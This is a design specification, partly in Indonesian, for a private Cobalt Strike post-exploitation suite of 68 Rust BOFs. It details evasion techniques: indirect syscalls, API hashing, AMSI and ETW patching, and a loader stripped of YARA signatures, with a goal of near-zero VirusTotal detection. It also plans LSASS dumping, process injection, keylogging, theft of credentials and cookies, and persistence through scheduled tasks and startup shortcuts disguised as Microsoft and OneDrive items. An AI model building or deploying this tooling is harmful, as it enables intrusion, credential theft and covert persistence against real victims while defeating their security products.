# DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite (Design)

**Status:** Approved 2026-06-11. Implementation plan akan ditulis terpisah via `writing-plans` skill.
**Author:** Dani (`daniagungg@gmail.com`)
**Repo:** `DEF-Situational-Awareness-BOF/` (local), private internal-team only.
**Credit notice:** Setiap BOF di suite ini adalah Rust port + OPSEC hardening **by Dani**. Implementasi C asli di-credit ke upstream (TrustedSec, REDMED-X, Outflank) di header tiap file.

---

## 1. Goal

Mengkonversi 66 BOF paling berguna dari empat referensi C ke Rust pakai template `rustbof` (joaoviictorti), plus dua BOF persistence original (COM Scheduled Task + COM Startup .LNK) — semuanya satu workspace tapi independen per crate, dengan tingkat **OPSEC maksimum** (indirect syscalls, API hashing, string obfuscation) dan **panic-safe** sehingga tidak pernah crash Beacon.

Sumber referensi:

| Referensi | Repo | Pilihan |
|---|---|---|
| TrustedSec CS-Situational-Awareness-BOF | `cs-sa-bof` | 28 BOFs |
| TrustedSec CS-Remote-OPs-BOF | `cs-remote-ops` | 18 BOFs |
| REDMED-X OperatorsKit | `operatorskit` | 12 BOFs |
| Outflank C2-Tool-Collection | `c2-tool-collection` | 8 BOFs |
| **Original by Dani** | — | 2 persistence BOFs |
| **Total** | | **68 BOFs** |

Template loader untuk testing: fork OPSEC-modified dari `0xTriboulet/InlineExecuteEx`.

## 2. Tech Stack

- Rust nightly `nightly-2025-01-25` (pinned via `rust-toolchain.toml`)
- Targets: `x86_64-pc-windows-gnu` + `i686-pc-windows-gnu`
- `rustbof` (git, main) — entry macro `#[rustbof::main]`, `BeaconAlloc`, `println!`/`eprintln!` macros
- `windows-sys` 0.52 — Win32 type definitions (we resolve functions dynamically via DFR, not via link imports)
- `obfstr` 0.4 — compile-time XOR string encryption
- `boflink` — TrustedSec's COFF linker that converts `lib<name>.a` → COFF `.o`
- `mingw-w64` — provides `x86_64-w64-mingw32-*` & `i686-w64-mingw32-*` toolchains on macOS
- `cargo-make` — orchestrate workspace builds
- Build host: macOS native (cross-compile to Windows COFF without VM/Docker)

## 3. Workspace Layout

```
DEF-Situational-Awareness-BOF/
├── Cargo.toml                          # workspace root
├── rust-toolchain.toml                 # nightly-2025-01-25
├── .cargo/config.toml                  # build-std + panic=abort + symbol-mangling-version=v0
├── Cargo.lock
├── README.md                           # credit Dani, build instructions
├── LICENSE                             # MIT (Dani copyright + upstream notices)
├── Makefile.toml                       # cargo-make tasks
├── scripts/
│   ├── setup_macos.sh                  # nightly + targets + mingw-w64 + boflink
│   ├── build_all.sh                    # iterate over crates → boflink → dist/{bof}.{x64,x86}.o
│   ├── build_one.sh                    # single crate
│   ├── verify_coff.sh                  # llvm-objdump + strings leak check
│   ├── gen_manifest.py                 # dist/manifest.json with SHA-256
│   └── smoke_test.sh                   # Layer-3 manual smoke (Win VM)
├── docs/
│   ├── superpowers/specs/2026-06-11-dani-rustbof-opsec-suite-design.md   # this file
│   ├── plans/2026-06-11-dani-rustbof-opsec-suite.md                      # implementation plan (writing-plans)
│   └── mitre-mapping.md                # BOF → ATT&CK technique table
├── common/                             # shared OPSEC primitives crate
│   └── src/{lib,syscalls,hash,dfr,obf,com,token,str_util,panic_safe,mitre,credit}.rs
├── situational-awareness/              # 28 BOF crates (flat-named: whoami, hostname, ...)
├── remote-ops/                         # 18 BOF crates (portscan, procdump, ...)
├── operators-kit/                      # 12 BOF crates (poolparty, xsession, ...)
├── c2-collection/                      # 8 BOF crates (psx, psk, kerberoast, ...)
├── persistence/                        # 2 BOF crates (schtask-com, lnk-startup)
├── tools/
│   └── inline-execute-ex-opsec/        # OPSEC-modified InlineExecuteEx fork (C++)
│       ├── src/, aggressor/, Makefile, scripts/encrypt_bof.py
└── dist/                               # build output: {bof}.{x64,x86}.o + manifest.json
```

## 4. `common` crate — OPSEC primitives

Single shared crate; tiap BOF depend langsung ke `common` + `rustbof` + `windows-sys` (minimal features) + `obfstr`.

### 4.1 Module map

```rust
// common/src/lib.rs
#![no_std]
extern crate alloc;

pub mod syscalls;   // HalosGate resolver + indirect syscall stubs
pub mod hash;       // const fn djb2/fnv1a + api_hash!() macro
pub mod dfr;        // Dynamic Function Resolver (PEB walk + export hash)
pub mod obf;        // re-export obfstr! as obf!()
pub mod com;        // ComGuard, ComRef<T>, Bstr (RAII over IUnknown/SysFreeString)
pub mod token;      // OpenProcessToken/Query/Adjust wrappers (indirect)
pub mod str_util;   // ascii_to_wide / wide_to_ascii (no_std)
pub mod panic_safe; // try_catch! macro + global panic handler (loop {})
pub mod mitre;      // MITRE ATT&CK technique constants + print_banner()
pub mod credit;     // pub const CREDIT: &str = "by Dani <daniagungg@gmail.com>";
```

### 4.2 Indirect syscalls (`syscalls.rs`)

**HalosGate** resolver (lebih reliable dari HellsGate karena handle hooked Nt* functions). Algoritma:

1. Walk PEB `InLoadOrderModuleList` → cari `ntdll.dll` by djb2 hash (case-insensitive on UTF-16 module name).
2. Parse PE export directory → cari function by djb2 hash dari export name string.
3. Read 32 byte awal stub. Kalau pattern bersih (`4C 8B D1 B8 ?? ?? 00 00 F6 04 25 ... 0F 05 C3`), extract SSN dari offset +4.
4. Kalau stub di-hook (mov rax,...jmp), scan ±16 function sekitar berdasarkan RVA terurut — SSN naik linier, jadi rekonstruksi SSN target dari tetangga.
5. Execute syscall via `jmp` ke instruction `syscall` di dalam ntdll itu sendiri (bukan `syscall` opcode di .text BOF) — call-stack tetap terlihat normal.

```rust
pub unsafe fn resolve_ssn(api_hash: u32) -> Result<u16, SyscallError>;
pub unsafe fn do_syscall(ssn: u16, args: &[usize]) -> NTSTATUS;
```

Macro `nt_syscall!` untuk ergonomi:
```rust
nt_syscall!(NtOpenProcessToken(process_handle, desired_access, &mut token_handle));
```

### 4.3 API hashing (`hash.rs`)

```rust
pub const fn djb2(s: &[u8]) -> u32 { /* const fn */ }
pub const fn djb2_case_insensitive(s: &[u8]) -> u32 { /* const fn */ }

#[macro_export]
macro_rules! api_hash {
    ($s:literal) => { $crate::hash::djb2($s.as_bytes()) };
}
```

Compile-time guarantee: tidak ada API name string apa pun di binary `.rdata`.

### 4.4 DFR (`dfr.rs`)

PEB walk → module match by hash → PE export parse → function match by hash → cached pointer.

Macro `dfr_fn!` untuk deklarasi:
```rust
dfr_fn!(
    GetAdaptersAddresses(ULONG, ULONG, *mut c_void, *mut IP_ADAPTER_ADDRESSES, *mut ULONG) -> ULONG,
    module = "iphlpapi.dll",
    api    = "GetAdaptersAddresses"
);
```

Expands ke fungsi safe yang resolve sekali (`AtomicPtr` cache), lalu transmute & call.

### 4.5 String obfuscation (`obf.rs`)

Re-export `obfstr::obfstr!` sebagai `obf!()`. Compile-time XOR, on-stack decrypt, zeroize after use. Diverify via `verify_coff.sh` (lihat §9).

### 4.6 COM helpers (`com.rs`)

```rust
pub struct ComGuard { _priv: () }
impl ComGuard {
    pub unsafe fn init_apartment() -> Result<Self, HRESULT>;
    pub unsafe fn init_multithreaded() -> Result<Self, HRESULT>;
}
impl Drop for ComGuard { fn drop(&mut self) { unsafe { CoUninitialize(); } } }

pub struct ComRef<T> { ptr: *mut T }
impl<T> Drop for ComRef<T> {
    fn drop(&mut self) {
        if !self.ptr.is_null() {
            unsafe { (*(self.ptr as *mut IUnknown)).Release(); }
        }
    }
}

pub struct Bstr(BSTR);
impl Drop for Bstr { fn drop(&mut self) { unsafe { SysFreeString(self.0); } } }
```

Auto-Release semua COM pointer. CLSID/IID di-hardcode sebagai `[u8; 16]` literal, **bukan** struct dengan field name plaintext.

### 4.7 MITRE ATT&CK runtime logging (`mitre.rs`)

**Requirement:** Setiap BOF, saat dijalankan, menampilkan baris MITRE technique di output Beacon **sebelum** logic utama dijalankan.

```rust
// common/src/mitre.rs
pub struct Technique {
    pub id: &'static str,      // "T1057"
    pub name: &'static str,    // "Process Discovery"
    pub tactic: &'static str,  // "Discovery"
}

pub fn print_banner(crate_name: &str, techniques: &[Technique]) {
    use rustbof::println;
    println!("================================================");
    println!("  {} — by Dani", crate_name);
    println!("================================================");
    for t in techniques {
        println!("  [MITRE] {} - {} ({})", t.id, t.name, t.tactic);
    }
    println!("------------------------------------------------");
}
```

Per-BOF declaration (di tiap `lib.rs`):
```rust
const TECHNIQUES: &[common::mitre::Technique] = &[
    common::mitre::Technique { id: "T1033", name: "System Owner/User Discovery", tactic: "Discovery" },
    common::mitre::Technique { id: "T1134", name: "Access Token Manipulation", tactic: "Privilege Escalation" },
];

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(())  => {},
        Err(e)  => rustbof::eprintln!("[!] {}", e),
    }
}
```

String banner ASCII + `T####` code di-hardcode plaintext (memang dimaksudkan untuk operator memahami apa yang dijalankan). Header `==` dan `--` adalah literal — **TIDAK** di-obfuscate karena memang harus dibaca operator. Ini intentional trade-off (transparansi operator vs. forensic signature). Karena baris ini terhitung "ouput", footprint signature ada di output Beacon-log, BUKAN di disk binary `.o` — jadi YARA tetap clean.

Output sample:
```
================================================
  sa-whoami — by Dani
================================================
  [MITRE] T1033 - System Owner/User Discovery (Discovery)
  [MITRE] T1134 - Access Token Manipulation (Privilege Escalation)
------------------------------------------------
USER:   CORP\jdoe
SID:    S-1-5-21-...
GROUPS: ...
TOKEN:  Primary, Integrity=High
```

`docs/mitre-mapping.md` berisi tabel master semua 68 BOF → technique IDs.

### 4.8 Panic safety (`panic_safe.rs`)

1. `panic = "abort"` di profile release.
2. `#![no_std]` everywhere.
3. rustbof template inject `#[panic_handler] fn _ {loop {}}` — kalau toh panic, thread hang bukan crash beacon.
4. Macro `try_catch!` convert any unsafe FFI ke `Result`. NEVER `unwrap`, `expect`, atau `?` di entry function.
5. Pattern wajib:
   ```rust
   #[rustbof::main]
   fn main() {
       common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
       match run() {
           Ok(()) => {},
           Err(e) => rustbof::eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
       }
   }
   fn run() -> Result<(), &'static str> { /* all logic here */ }
   ```
6. Pointer dereference selalu didahului `is_null()` + length validation.
7. Clippy lint: `-D unwrap_used -D expect_used -D panic` di CI lokal.

## 5. Per-BOF crate template

Setiap BOF crate berstruktur identik (memudahkan automation & review):

```toml
# situational-awareness/sa-whoami/Cargo.toml
[package]
name = "sa-whoami"
version = "0.1.0"
edition = "2024"
authors = ["Dani <daniagungg@gmail.com>"]
description = "Token info dump — by Dani. Original C: TrustedSec/cs-situational-awareness-bof (whoami.c)"
license = "MIT"

[dependencies]
rustbof.workspace      = true
common.workspace       = true
windows-sys.workspace  = true
obfstr.workspace       = true

[lib]
crate-type = ["staticlib"]
name       = "sa_whoami"
```

```rust
// situational-awareness/sa-whoami/src/lib.rs
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
// Original C: TrustedSec/cs-situational-awareness-bof — whoami.c
//
#![no_std]
#![cfg_attr(not(test), no_main)]
extern crate alloc;

use rustbof::{println, eprintln};
use common::{mitre::Technique, obf, syscalls, token};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1033", name: "System Owner/User Discovery", tactic: "Discovery" },
    Technique { id: "T1134", name: "Access Token Manipulation",   tactic: "Privilege Escalation" },
];

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(())  => {},
        Err(e)  => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    // indirect-syscall NtOpenProcessToken + NtQueryInformationToken via common::syscalls
    // string "SeDebugPrivilege" via obf!()
    // ...
    Ok(())
}
```

## 6. BOF Inventory (68 total)

### 6.1 Situational Awareness — 28 BOFs (`situational-awareness/`)

Credit C: TrustedSec / `cs-sa-bof/src/SA/*`.

| # | Crate | Original | Tujuan | Inti API (post-OPSEC) | MITRE |
|---|---|---|---|---|---|
| 1 | `arp` | arp/ | ARP cache | indirect `NtDeviceIoControlFile`, fallback DFR `GetIpNetTable2` | T1018 |
| 2 | `env` | env/ | Env vars | `RtlGetCurrentPeb()->ProcessParameters->Environment` (zero-API) | T1082 |
| 3 | `ipconfig` | ipconfig/ | Adapter info | DFR `GetAdaptersAddresses` | T1016 |
| 4 | `netstat` | netstat/ | TCP/UDP conn | indirect `NtDeviceIoControlFile` → `\Device\Tcp`, `\Device\Udp` | T1049 |
| 5 | `netuser` | netuser/ | Local/domain user | DFR `NetUserEnum` | T1087.001, T1087.002 |
| 6 | `netshare` | netshares/ | SMB shares | DFR `NetShareEnum` | T1135 |
| 7 | `netloggedon` | netloggedon/ | Logged-on users | DFR `NetWkstaUserEnum` | T1033 |
| 8 | `tasklist` | tasklist/ | Process list | indirect `NtQuerySystemInformation(SystemProcessInformation)` — no WMI | T1057 |
| 9 | `whoami` | whoami/ | Token info | indirect `NtOpenProcessToken` + `NtQueryInformationToken` | T1033, T1134 |
| 10 | `schtasksquery` | schtasksquery/ | Scheduled tasks | COM `ITaskService` via DFR `CoCreateInstance` | T1053.005, T1518 |
| 11 | `reg-query` | reg_query/ | Registry read | DFR `RegOpenKeyExA` + Enum | T1012 |
| 12 | `windowlist` | windowlist/ | Window enum | DFR `EnumWindows` (extern "system" callback) | T1010 |
| 13 | `uptime` | uptime/ | Uptime | `KUSER_SHARED_DATA` @ `0x7FFE0000` (zero-API) | T1082 |
| 14 | `routeprint` | routeprint/ | Routing table | DFR `GetIpForwardTable2` | T1016 |
| 15 | `ldapsearch` | ldapsearch/ | LDAP query | DFR `ldap_bind` + `ldap_search_ext` | T1087.002, T1018 |
| 16 | `nonpaged-ldapsearch` | nonpagedldapsearch/ | LDAP non-paged (stealth) | indirect ADSI via COM | T1087.002 |
| 17 | `adcs-enum-com` | adcs_enum_com/ | ADCS template enum | COM `ICertConfig` + `IEnrollmentPolicyServer` | T1518.001 |
| 18 | `list-firewall` | list_firewall_rules/ | Firewall rules | Registry walk `HKLM\System\...\FirewallPolicy` | T1518.001 |
| 19 | `enum-filter-driver` | enum_filter_driver/ | Mini-filter drivers | DFR `FilterFindFirst`/`Next` | T1518.001, T1014 |
| 20 | `wmi-query` | wmi_query/ | Generic WMI | COM `IWbemServices::ExecQuery` | T1047 |
| 21 | `get-dpapi-system` | get_dpapi_system/ | DPAPI system master key | indirect LSASS access + DFR `LsaRetrievePrivateData` | T1555.004 |
| 22 | `hostname` | derived from whoami | NetBIOS+FQDN | DFR `GetComputerNameExA` (3 modes) | T1082 |
| 23 | `clipboard` | clipboard/ | Clipboard dump | DFR `GetClipboardData(CF_UNICODETEXT)` | T1115 |
| 24 | `dnscache` | dnscache/ | DNS cache | DFR `DnsGetCacheDataTable` | T1016.001 |
| 25 | `driversigs` | driversigs/ | Driver signature info | DFR `WinVerifyTrust` | T1518.001 |
| 26 | `findmodule` | findLoadedModule/ | Find module in remote PID | indirect `NtQueryInformationProcess` + PEB walk | T1057 |
| 27 | `sccm-decrypt` | sccm_decrypt/ | SCCM secret decrypt | DPAPI via DFR | T1555 |
| 28 | `ldapsec-check` | ldapsecuritycheck/ | LDAP sign/binding probe | DFR ldap SSPI | T1518 |

### 6.2 Remote Operations — 18 BOFs (`remote-ops/`)

Credit C: TrustedSec / `cs-remote-ops/src/{Remote,Injection}/*`.

| # | Crate | Original | Tujuan | OPSEC notes | MITRE |
|---|---|---|---|---|---|
| 29 | `portscan` | (implement fresh) | TCP connect-scan | non-blocking DFR `WSASocketW` | T1046 |
| 30 | `etw-patch` | derived | Patch `EtwEventWrite` → `xor eax,eax; ret` | indirect `NtProtectVirtualMemory` | T1562.006 |
| 31 | `amsi-patch` | derived | Patch `AmsiScanBuffer` → E_INVALIDARG | indirect protect+write | T1562.001 |
| 32 | `enablepriv` | get_priv/ modified | Enable token privilege | indirect `NtAdjustPrivilegesToken` | T1134.002 |
| 33 | `procdump` | procdump/ | MiniDump LSASS or PID | DFR `MiniDumpWriteDump` + obfstr temp filename | T1003.001 |
| 34 | `ghost-task` | ghost_task/ | Hidden scheduled task | COM `ITaskService` + SD modification | T1053.005 |
| 35 | `reg-save` | reg_save/ | Remote reg hive dump | DFR `RegSaveKeyEx` | T1003.002, T1012 |
| 36 | `sc-create` | sc_create/ | Remote service create | DFR `OpenSCManagerA` + `CreateServiceA` | T1543.003 |
| 37 | `sc-delete` | sc_delete/ | Remote service delete | DFR | T1489 |
| 38 | `adduser` | adduser/ | Local user add | DFR `NetUserAdd` | T1136.001 |
| 39 | `make-token` | make_token_cert/ | Cert-based token | DFR `LogonUserA` | T1134.003 |
| 40 | `shspawnas` | shspawnas/ | Spawn as user | DFR `CreateProcessWithLogonW` | T1134.002 |
| 41 | `suspendresume` | suspendresume/ | Suspend/resume PID | indirect `NtSuspendProcess`/`NtResumeProcess` | T1055 |
| 42 | `global-unprotect` | global_unprotect/ | DPAPI Chrome cookie decrypt | DFR DPAPI | T1555.003 |
| 43 | `inject-crt` | createremotethread/ | CreateRemoteThread inject | indirect syscalls + RWX→RX flip | T1055.002 |
| 44 | `inject-ntcreate` | ntcreatethread/ | NtCreateThreadEx inject | indirect syscall | T1055 |
| 45 | `inject-apc` | ntqueueapcthread/ | APC inject | indirect syscall | T1055.004 |
| 46 | `inject-ktable` | kernelcallbacktable/ | KernelCallbackTable hijack | indirect syscall + PEB write | T1055 |

### 6.3 OperatorsKit selects — 12 BOFs (`operators-kit/`)

Credit C: REDMED-X / `operatorskit/KIT/*`.

| # | Crate | Original | Tujuan | OPSEC notes | MITRE |
|---|---|---|---|---|---|
| 47 | `inject-poolparty` | InjectPoolParty/ | Thread pool inject (flagship) | indirect `NtSetTimer2`, handle stealing | T1055 |
| 48 | `execute-crosssession` | ExecuteCrossSession/ | Cross-session lateral | COM `IStandardActivator` + `IHxHelpPaneServer` | T1021.003 |
| 49 | `dcom-localserver32` | DcomLocalServer32/ | DCOM CLSID exec | COM `CoCreateInstanceEx` + COAUTHINFO | T1021.003 |
| 50 | `keylogger-rawinput` | KeyloggerRawInput/ | Raw-input keylog | DFR `RegisterRawInputDevices` | T1056.001 |
| 51 | `enum-sec-products` | EnumSecProducts/ | AV/EDR detection | WMI `root\SecurityCenter2` + svc enum | T1518.001 |
| 52 | `enum-sysmon` | EnumSysmon/ | Sysmon detection | minifilter + registry | T1518.001 |
| 53 | `spn` | SPN/ | SPN kerberoast prep | DFR ldap | T1558.003 |
| 54 | `wifi-passwords` | WiFiPasswords/ | WLAN profile dump | DFR `WlanEnumInterfaces` | T1555 |
| 55 | `cred-prompt` | CredPrompt/ | Persistent cred UI | DFR `CredUIPromptForWindowsCredentials` | T1056.002 |
| 56 | `add-exclusion` | AddExclusion/ | Defender excl add | WMI `MSFT_MpPreference` | T1562.001 |
| 57 | `capture-netntlm` | CaptureNetNTLM/ | NetNTLMv2 capture | SSPI w/ NTLM | T1187 |
| 58 | `authenticate-http` | AuthenticateHTTP/ | NTLM HTTP relay primer | WinHTTP w/ NTLM | T1187 |

### 6.4 C2-Tool-Collection selects — 8 BOFs (`c2-collection/`)

Credit C: Outflank / `c2-tool-collection/BOF/*`.

| # | Crate | Original | Tujuan | OPSEC notes | MITRE |
|---|---|---|---|---|---|
| 59 | `psx` | Psx/ | Process+token+secproducts | indirect `NtQueryInformationProcess`+`Token` | T1057, T1134 |
| 60 | `psk` | Psk/ | Kernel drivers & secproducts | indirect `NtQuerySystemInformation(SystemModuleInformation)` | T1518.001 |
| 61 | `psm` | Psm/ | Process modules+connections | indirect syscalls full chain | T1057, T1016 |
| 62 | `findobjects` | FindObjects/ | Find safe inject targets | indirect `NtOpenProcessToken` + module scan | T1057 |
| 63 | `kerberoast` | Kerberoast/ | Service ticket request | DFR LSA SSPI | T1558.003 |
| 64 | `lapsdump` | Lapsdump/ | LAPS pwd from AD | LDAP `ms-Mcs-AdmPwd` | T1555 |
| 65 | `wdtoggle` | WdToggle/ | Cred Guard bypass + WDigest | indirect LSASS write | T1003.001, T1112 |
| 66 | `cve-2022-26923` | CVE-2022-26923/ | AD CS dNSHostName spoof | LDAP + cert request | T1068 |

### 6.5 Persistence (original, by Dani) — 2 BOFs (`persistence/`)

| # | Crate | Tujuan | API | MITRE |
|---|---|---|---|---|
| 67 | `schtask-com` | Scheduled task via COM (no `schtasks.exe`) | `ITaskService`, args `--name --cmd --trigger --hidden --principal --remove` | T1053.005 |
| 68 | `lnk-startup` | Startup .LNK via COM (no `explorer`, no `cmd`) | `IShellLinkW` + `IPersistFile`, args `--name --target --args --icon --workdir --scope --remove` | T1547.001 |

### 6.6 Universal rules (semua BOF)

- **Tidak ada** spawn proses external (`cmd.exe`, `wscript.exe`, `schtasks.exe`, `reg.exe`, `net.exe`).
- Semua API ntdll `Nt*`/`Zw*` via **indirect syscalls** (HalosGate + jump-to-ntdll-syscall-stub).
- Semua Win32 lain via **DFR** (PEB walk + hashed export resolve). Tidak ada `extern "system"` import langsung di `lib.rs` BOF.
- Semua string sensitive (API name, registry key, file path, CLSID) via `obf!()`.
- Setiap COM pointer via `ComRef<T>` RAII.
- Beacon `CALLBACK_OUTPUT_UTF8` (0x20) untuk hasil, `CALLBACK_ERROR` (0x0D) untuk error.
- Banner MITRE wajib di-print pertama (transparansi operator).

## 7. Persistence BOF detail

### 7.1 `schtask-com`

Operator args (parsed via `rustbof::DataParser`):

| Flag | Default | Catatan |
|---|---|---|
| `--name` | `Microsoft\Windows\Maintenance\StartComponentCleanup-{rand8}` | Path task (folder/leaf). Spoof default mengikuti naming Windows native. |
| `--cmd` | (required) | Command + args to execute |
| `--trigger` | `logon` | `logon` \| `onstart` \| `calendar:HH:MM` \| `daily:HH:MM` \| `logoff` |
| `--hidden` | `true` | Sets `TaskDefinition.Settings.Hidden = VARIANT_TRUE` |
| `--principal` | `user` | `user` (current) \| `system` (LOGON_SERVICE_ACCOUNT, requires elevation) |
| `--remove` | (off) | Cleanup mode: deletes task by `--name` |

Pseudocode:

```
print MITRE banner: T1053.005
let _com = ComGuard::init_apartment()?;
let svc: ComRef<ITaskService> = co_create_via_dfr(CLSID_TaskScheduler, IID_ITaskService)?;
svc.Connect(NULL, NULL, NULL, NULL)?;        // local
let folder = svc.GetFolder(path_prefix)?;
if remove { folder.DeleteTask(leaf, 0)?; return Ok(()); }
let def = svc.NewTask(0)?;
def.RegistrationInfo.Author = obf!("Microsoft Corporation");
def.Settings.Hidden = VARIANT_TRUE;
def.Settings.AllowDemandStart = VARIANT_TRUE;
def.Settings.StartWhenAvailable = VARIANT_TRUE;
def.Settings.DisallowStartIfOnBatteries = VARIANT_FALSE;
let trig = def.Triggers.Create(map_trigger(--trigger))?;
let act = def.Actions.Create(TASK_ACTION_EXEC)?;
act.Path = path; act.Arguments = args;
let principal = def.Principal;
match --principal {
    "system" => { principal.LogonType = TASK_LOGON_SERVICE_ACCOUNT; principal.UserId = obf!("SYSTEM"); }
    _        => { principal.LogonType = TASK_LOGON_INTERACTIVE_TOKEN; }
}
folder.RegisterTaskDefinition(leaf, def, TASK_CREATE_OR_UPDATE, NULL, NULL, principal.LogonType, NULL)?;
println!("[+] task registered: {}", path);
```

### 7.2 `lnk-startup`

Operator args:

| Flag | Default | Catatan |
|---|---|---|
| `--name` | `OneDrive.lnk` | LNK filename (spoof) |
| `--target` | (required) | Target executable |
| `--args` | `""` | Arguments to target |
| `--icon` | `%SystemRoot%\System32\imageres.dll,2` | Icon location (folder icon) |
| `--workdir` | `%APPDATA%\Microsoft\OneDrive` | Working directory |
| `--scope` | `user` | `user` (Current User Startup) \| `allusers` (Common Startup, requires admin) |
| `--remove` | (off) | Cleanup mode: deletes LNK by `--name` and `--scope` |

Pseudocode:

```
print MITRE banner: T1547.001
let _com = ComGuard::init_apartment()?;
let sl: ComRef<IShellLinkW> = co_create_via_dfr(CLSID_ShellLink, IID_IShellLinkW)?;
sl.SetPath(target)?;
sl.SetArguments(args)?;
sl.SetIconLocation(icon, 0)?;
sl.SetWorkingDirectory(workdir)?;
sl.SetDescription(obf!("OneDrive"))?;
sl.SetShowCmd(SW_SHOWMINNOACTIVE)?;
let pf: ComRef<IPersistFile> = sl.QueryInterface(IID_IPersistFile)?;
let startup_dir = sh_get_known_folder(match --scope {
    "allusers" => FOLDERID_CommonStartup,
    _          => FOLDERID_Startup,
})?;
let full = startup_dir + "\\" + name;
if remove {
    nt_delete_file(&full)?;
    return Ok(());
}
pf.Save(full_wide, TRUE)?;
println!("[+] lnk dropped: {}", full);
```

## 8. Build pipeline (native macOS)

### 8.1 `scripts/setup_macos.sh` (one-time)

```bash
#!/usr/bin/env bash
set -euo pipefail

# Toolchain
rustup toolchain install nightly-2025-01-25
rustup component add rust-src --toolchain nightly-2025-01-25
rustup target add x86_64-pc-windows-gnu --toolchain nightly-2025-01-25
rustup target add i686-pc-windows-gnu   --toolchain nightly-2025-01-25

# MinGW (needed for std archive shims + boflink)
which x86_64-w64-mingw32-gcc || brew install mingw-w64

# boflink (TrustedSec)
cargo install boflink

# cargo-make
cargo install --locked cargo-make

# Verify
boflink --version
cargo +nightly-2025-01-25 --version
```

### 8.2 `scripts/build_all.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail
mkdir -p dist
declare -a CRATES
mapfile -t CRATES < <(cargo metadata --no-deps --format-version 1 \
  | jq -r '.packages[] | select(.name | test("^(sa|ro|ok|c2|ps)-")) | "\(.name) \(.manifest_path)"')

for entry in "${CRATES[@]}"; do
  name="${entry% *}"; manifest="${entry#* }"
  un="${name//-/_}"
  for tgt in x86_64-pc-windows-gnu i686-pc-windows-gnu; do
    arch=$([[ "$tgt" == x86_64* ]] && echo x64 || echo x86)
    mingw=$([[ "$tgt" == x86_64* ]] && echo --mingw64 || echo --mingw32)
    cargo +nightly-2025-01-25 build --release --target "$tgt" --manifest-path "$manifest"
    archive="$(dirname "$manifest")/../../target/$tgt/release/lib${un}.a"
    out="dist/${name}.${arch}.o"
    args=( "$mingw" "$archive" -lkernel32 -ladvapi32 -lole32 -loleaut32 -o "$out" )
    [[ "$arch" == "x86" ]] && args+=( --entry-symbol "_go" )
    boflink "${args[@]}"
    echo "  ✓ $out"
  done
done

# OPSEC loader
echo "Building inline-execute-ex-opsec fork..."
make -C tools/inline-execute-ex-opsec/ CROSS=x86_64-w64-mingw32- ARCH=x64
make -C tools/inline-execute-ex-opsec/ CROSS=i686-w64-mingw32-   ARCH=x86
cp tools/inline-execute-ex-opsec/build/bofx.x64.o dist/
cp tools/inline-execute-ex-opsec/build/bofx.x86.o dist/

python3 scripts/gen_manifest.py > dist/manifest.json
bash scripts/verify_coff.sh
```

### 8.3 `scripts/verify_coff.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail
fail=0
for f in dist/*.o; do
  llvm-objdump -h "$f" >/dev/null || { echo "FAIL: $f bad object"; fail=1; }
  llvm-readobj --symbols "$f" | grep -q "Name: _\?go" || { echo "FAIL: $f missing go symbol"; fail=1; }
  leaked=$(strings "$f" | grep -ciE \
    'ntopenprocesstoken|cocreateinstance|software\\microsoft\\windows\\currentversion\\run|sedebugprivilege|inline ?execute ?ex' \
    || true)
  [ "$leaked" -eq 0 ] || { echo "FAIL: $f leaked $leaked sensitive strings"; fail=1; }
done
[ "$fail" -eq 0 ] && echo "✓ all $(ls dist/*.o | wc -l | tr -d ' ') objects verified"
```

## 9. Testing strategy

**Layer 1 — host unit tests** (`cargo test --target aarch64-apple-darwin`):

- `common::hash` — djb2 known-vector, const-fn equivalence, collision check across ntdll+iphlpapi+ldap+ole32 exports.
- `common::dfr` — mocked PEB walk path.
- `common::obf` — built test bin, `strings | grep` returns 0.
- `common::com` — RAII Drop ordering (mock IUnknown counter).
- `common::mitre` — banner format snapshot test.
- Per-BOF: `rustbof::DataParser` argument parsing against canned byte buffers.

**Layer 2 — COFF artifact verification**: `verify_coff.sh` (above), runs in `build_all.sh`.

**Layer 3 — Windows VM smoke test** (manual, 1× per release):

- Win10 + Win11 VM with CS teamserver.
- Load each `.o` via aggressor: `inline-execute dist/<bof>.x64.o` (native CS loader) OR `bofx dist/<bof>.x64.o go args` (OPSEC fork loader).
- Acceptance: no beacon crash, MITRE banner muncul, output expected, exit clean.
- Persistence: `Get-ScheduledTask` / `Get-ChildItem $env:APPDATA\...\Startup` confirms artifact. Reboot → fires. `--remove` flag confirmed deletes.
- Trust-the-operator policy: jika operator melaporkan device-side test sukses, jangan re-spec verifikasi yang sama.

**Layer 4 — EDR static check** (opsional, sebelum release):

- VirusTotal private upload → target ≤ 2/70 detection.
- Defender + ESET local scan → pass.

## 10. Test harness: InlineExecuteEx (OPSEC fork)

Upstream `0xTriboulet/InlineExecuteEx` adalah BOF yang load BOF lain di Beacon (COFFLoader + PE loader + `pic` entry mode dengan `API_TABLE` vtable). Fork OPSEC-hardened di-vendor ke `tools/inline-execute-ex-opsec/`.

**Modifikasi yang diterapkan (vs upstream):**

| # | Upstream | Modifikasi | Alasan |
|---|---|---|---|
| 1 | Banner `"BOF+"` + `"[EXPERIMENTAL] I heard you like BOFs"` di aggressor | Banner dihapus; command name `inline-execute-ex` → `bofx` (configurable via `-DCMD_NAME`) | YARA signature reduction |
| 2 | Symbol names plaintext (`runBof`, `runPE`, `isValidCoff`, `g_apiTable`) | `-fvisibility=hidden`, `--strip-all`, internal rename | Loader fingerprint reduction |
| 3 | `g_if` DFR cache plaintext di .bss | XOR rolling-key encrypt cache, zero out di akhir `go` | Memory scanner resistance |
| 4 | COFF parser strings (`".text"`, `".data"`, `"go"`) di .rdata | Stack-strings (char-by-char init) | Static signature |
